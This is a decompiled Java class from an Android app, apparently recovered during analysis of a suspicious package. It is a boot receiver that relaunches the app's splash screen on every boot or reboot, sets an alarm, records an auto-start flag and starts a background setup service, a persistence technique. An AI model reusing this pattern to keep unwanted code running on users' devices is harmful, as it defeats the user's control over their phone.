/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  android.content.BroadcastReceiver
 *  android.content.Context
 *  android.content.Intent
 *  android.os.Build$VERSION
 */
package linker.resourcer.encoder;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import linker.resourcer.encoder.AlarmHelper;
import linker.resourcer.encoder.BootCompletedReceiver$$ExternalSyntheticLambda0;
import linker.resourcer.encoder.SplashActivity;
import linker.resourcer.encoder.ConfigurationConstants;
import linker.resourcer.encoder.SetupOrchestrationService;
import linker.resourcer.encoder.SystemUtilities;
import linker.resourcer.encoder.SharedPreferencesManager;

public class BootCompletedReceiver
extends BroadcastReceiver {
    static /* synthetic */ void lambda$onReceive$0(Intent intent, Context context) {
        if (intent.getAction() != null && (intent.getAction() == "android.intent.action.BOOT_COMPLETED" || intent.getAction() == "android.intent.action.REBOOT")) {
            try {
                intent = new Intent(context, SplashActivity.class);
                intent.addFlags(0x10000000);
                intent.addFlags(32768);
                intent.addFlags(0x4000000);
                context.startActivity(intent);
            }
            catch (Exception exception) {
                // empty catch block
            }
        }
        AlarmHelper.setAlarm(context);
        SharedPreferencesManager.WriteBool(context, ConfigurationConstants.AutoStartOn, true);
        intent = new Intent(context, SetupOrchestrationService.class);
        if (!SystemUtilities.isServiceRunning(context, SetupOrchestrationService.class)) {
            if (Build.VERSION.SDK_INT >= 26) {
                context.startForegroundService(intent);
            } else {
                context.startService(intent);
            }
        }
    }

    public void onReceive(Context context, Intent intent) {
        new Thread(new BootCompletedReceiver$$ExternalSyntheticLambda0(intent, context)).start();
    }
}

